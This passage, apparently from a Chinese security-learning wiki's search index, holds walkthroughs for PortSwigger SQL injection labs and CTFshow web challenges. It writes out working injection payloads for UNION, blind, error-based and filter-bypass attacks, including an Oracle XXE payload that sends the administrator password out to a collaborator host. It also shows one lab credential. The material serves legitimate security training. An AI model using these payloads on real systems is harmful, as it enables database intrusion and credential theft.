找到闭合确定了字段数，如何判断是什么数据库呢？见SQL注入利用篇 ‘ and 11 UNION SELECT ‘a’,banner FROM v$version–+ Lab4Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft step: Gifts’ or 11–+，Gifts’ or 12–+ 找到闭合 order by 判断字段后 联合查询 Gifts’ union select 1,version()–+ Lab5Lab: SQL injection attack, listing the database contents on non-Oracle databases https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle step: 闭合判断字段后，进行联合查询Gifts’ union select null,null–+ Gifts’ union select null,database()–+ 显示错误，尝试其它的数据库，Gifts’ union select null,current_database()–+，确定为psotgreSQL Gifts’+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables– 找到users表 Gifts’+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name’users_imbvkh’– 查字段名 找到了username字段、password字段 Gifts’+UNION+SELECT+username_xltqyz,+password_wnxhyl+FROM+users_imbvkh–，然后登陆账号即可。 information_schema.tables 是 MySQL 和其他关系型数据库（如 PostgreSQL、SQL Server）中的一个系统视图，用于存储数据库中所有表的信息。可以自己在数据库中尝试查看该表的数据去了解该表。 Lab6Lab: SQL injection attack, listing the database contents on Oracle https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle step: Pets’ or 11– Pets’ or 12– 找到闭合 order by 判断字段 Pets’ union select null,null from dual–+ Pets’ and 12 union select null,table_name from all_tables – 找到用户名表 USERS_ZDWAIY Gifts’+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name’USERS_ZDWAIY’– PASSWORD_TUKOGZ USERNAME_GHFJOM 找到列名 Gifts’+UNION+SELECT+USERNAME_GHFJOM,+PASSWORD_TUKOGZ+FROM+USERS_ZDWAIY– 得到账号密码 并登录 Lab7Lab: SQL injection UNION attack, determining the number of columns returned by the query https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns step: 找到闭合 order by判断字段数 ‘union select null,null,null– Lab8Lab: SQL injection UNION attack, finding a column containing text https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text step: ​\tPets’union select null,’giMbRU’,null–+ Lab9Lab: SQL injection UNION attack, retrieving data from other tables https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables step: Gifts’ union select username,password from users–+ Lab10Lab: SQL injection UNION attack, retrieving multiple values in a single column https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column step: 找到闭合判断列数 Tech+gifts’ union select null,concat(username,’~’,password) from users–+ 使用concat进行在一个字段中检索多个值。 也可以使用字符串连接运算符 Tech+gifts’ UNION+SELECT+NULL,username||’~’||password+FROM+users–（||（双竖线）：用于连接字符串，在 PostgreSQL、Oracle、SQLite 以及部分 SQL 方言中有效。） administrator~vkltzrpvfk54pvgozg2w Lab11Lab: Blind SQL injection with conditional responses https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses step: TrackingIdFDMzoanbTIDaYkYV’and 11–; TrackingIdFDMzoanbTIDaYkYV’and 12–; 发现welcome back会消失 TrackingIdFDMzoanbTIDaYkYV’ order by 1–; 并发现无法进行联合查询注入 利用子查询进行布尔注入 Lab12Lab: Blind SQL injection with conditional errors https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors step: oracle盲注 Lab13Lab: Visible error-based SQL injection https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based step: ‘ AND CAST((SELECT 1) AS int)– CAST()数据类型转换 函数 ‘ AND 1CAST((SELECT 1) AS int)– ‘ AND 1CAST((SELECT username FROM users) AS int)– ‘AND 1CAST((SELECT username FROM users limit 1) AS int)– Lab14Lab: Blind SQL injection with time delays https://portswigger.net/web-security/sql-injection/blind/lab-time-delays Lab15Lab: Blind SQL injection with time delays and information retrieval https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval lab16Lab: Blind SQL injection with out-of-band interaction https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band step: TrackingIdx’+UNION+SELECT+EXTRACTVALUE(xmltype(‘%3fxml+version%3d”1.0”+encoding%3d”UTF-8”%3f!DOCTYPE+root+[+!ENTITY+%25+remote+SYSTEM+”http%3a‘||(SELECT+password+FROM+users+WHERE+username%3d’administrator’)||’.BURP-COLLABORATOR-SUBDOMAIN“+%25remote%3b]’),’l’)+FROM+dual– 结合 SQL 注入 和 XXE 进行 OOB 数据泄露，适用于 Oracle 数据库。 Lab17Lab: Blind SQL injection with out-of-band data exfiltration https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration ‘+UNION+SELECT+EXTRACTVALUE(xmltype(‘%3fxml+version%3d”1.0”+encoding%3d”UTF-8”%3f!DOCTYPE+root+[+!ENTITY+%25+remote+SYSTEM+”http%3a‘||(SELECT+password+FROM+users+WHERE+username%3d’administrator’)||’.BURP-COLLABORATOR-SUBDOMAIN“+%25remote%3b]’),’l’)+FROM+dual– 结合 SQL 注入 和 XXE 进行 OOB 数据泄露，适用于 Oracle 数据库。发送http请求。 Lab18Lab: SQL injection with filter bypass via XML encoding https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding step1: 1+1 发现产生了响应 进行or 11 发现被waf拦截了 使用hackvertor进行encode hex_entities编码进行bypass 进行判断字段，最后得到密码 1 UNION SELECT username || ‘~’ || password FROM users"},{"title":"CTFshow-web入门1000题","path":"/wiki/CTF/CTFshow-web入门1000题.html","content":"web1考点解析： 查看源码，HTML 源码泄露 解题思路： ctrl U 查看源码，找到 flag。HTML 注释里找到 flag web2考点解析： 查看源码，HTML 源码泄露 解题思路： ctrl U 查看源码，找到 flag。HTML 注释里找到 flag。 也可以 ctrl+shift+i 打开调试器，在事件监听器里，将事件都删除再使用 F12。 本题相较于第一题，变化在于这么一段 JS，禁止了网页的某些默认行为。 script type=text/javascript\twindow.oncontextmenu = function()return false;\t// 禁止右键菜单（contextmenu 事件）。\twindow.onselectstart = function()return false;\t// 禁止文本选择（selectstart 事件）。\twindow.onkeydown = function()if (event.keyCode==123)event.keyCode=0;event.returnValue=false;; // 禁止文本选择（selectstart 事件）。/script 1. window.oncontextmenu = function()return false; 作用：禁止右键菜单（contextmenu 事件）。 原理： 当用户右键点击页面时，浏览器会触发 contextmenu 事件。 return false 阻止默认行为（即右键菜单不会弹出）。 影响： 用户无法通过右键菜单复制、查看源代码或使用浏览器扩展功能。 2. window.onselectstart = function()return false; 作用：禁止文本选择（selectstart 事件）。 原理： 当用户尝试用鼠标选择文本时，浏览器会触发 selectstart 事件。 return false 阻止文本被选中。 影响： 用户无法用鼠标选中、复制网页上的文字内容。 3.window.onkeydown=function()if(event.keyCode==123)event.keyCode=0;event.returnValue=false;; 作用：阻止按 F12 键（keyCode=123 对应 F12）。 原理： 当用户按下 F12 时，浏览器会触发 keydown 事件。 keyCode=123 代表 F12，通常用于打开开发者工具（DevTools）。 event.keyCode = 0尝试“欺骗”浏览器，让某些旧版浏览器忽略按键，让它认为没有按任何有效键。 event.returnValue = false确保即使 keyCode 修改失败，仍然阻止默认行为（如 F12 打开开发者工具） 影响： 用户无法直接按 F12 打开开发者工具（但仍有其他方式可以绕过）。 web3考点解析： 响应头信息泄露。 解题思路： 在响应头中找到 flag。 Web4考点解析：robots.txt 解题思路： 访问robots.txt，发现 Disallow: flagishere.txt，访问flagishere.txt 得到 flag。 Web5考点解析: index.phps 文件信息泄露 什么是 index.phps？ .phps 是 “PHP Source” 的缩写 当服务器配置了处理 .phps 扩展名时，访问这样的文件会显示语法高亮的源代码而不是执行它 这是一种方便开发者查看 PHP 源代码的方式 解题思路： 访问 index.phps Web6考点解析： 备份文件源码泄露 解题思路： 查看网页源码，检查网络请求后无果，尝试扫描目录发现 www.zip文件，解压后发现 fl000g.txt，但是打开后没有 flag，且日期是 2020 年，所以直接在网络资源访问 fl000g.txt，得到 flag。","categories":[null]},{"title":"信息收集","path":"/wiki/WebSec/信息收集.html","content":"test"}]